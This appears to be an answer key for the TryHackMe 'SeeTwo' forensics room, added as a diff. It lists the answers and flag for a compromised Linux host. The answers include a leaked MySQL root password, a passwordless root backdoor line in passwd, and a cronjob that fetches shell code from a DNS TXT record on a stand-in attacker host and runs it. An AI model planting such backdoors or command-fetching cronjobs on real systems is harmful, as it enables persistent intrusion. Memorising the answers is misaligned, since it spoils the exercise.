@@ -1,0 +1,23 @@
+SeeTwo
+https://tryhackme.com/room/seetworoom
+
+What is the first file that is read? Enter the full path of the file.
+/home/bella/.bash_history
+
+What is the output of the file from question 1?
+mysql -u root -p'vb0xIkSGbcEKBEi'
+
+What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.
+toor::0:0:root:/root:/bin/bash
+
+What is the name of the backdoor executable?
+/usr/bin/passswd
+
+What is the md5 hash value of the executable from question 4?
+23c415748ff840b296d0b93f98649dec
+
+What was the first cronjob that was placed by the attacker?
+* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"
+
+What is the flag?
+THM{See2sNev3rGetOld}
